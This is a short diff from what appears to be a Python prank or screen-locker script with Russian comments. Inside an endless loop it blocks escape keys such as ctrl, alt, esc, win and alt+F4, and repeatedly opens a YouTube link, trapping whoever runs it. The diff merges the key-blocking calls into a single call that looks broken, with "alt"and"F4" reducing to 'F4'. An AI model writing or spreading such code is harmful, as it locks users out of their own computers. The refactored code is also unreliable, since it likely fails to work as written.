@@ -39,12 +39,7 @@ elif lic in otvetda:
  
     if lvl == 1:
         while lvl1:
-                keyboard.block_key("alt")
-                keyboard.block_key("ctrl")
-                keyboard.block_key("shift")
-                keyboard.block_key("esc")
-                keyboard.block_key("win")
-                keyboard.block_key("alt"and"F4")
+                keyboard.block_key("alt","ctrl","shift","esc","win","alt"and"F4")
                 webbrowser.open("https://www.youtube.com/watch?v=xvFZjo5PgG0")
 
 #УРОВЕНЬ 2
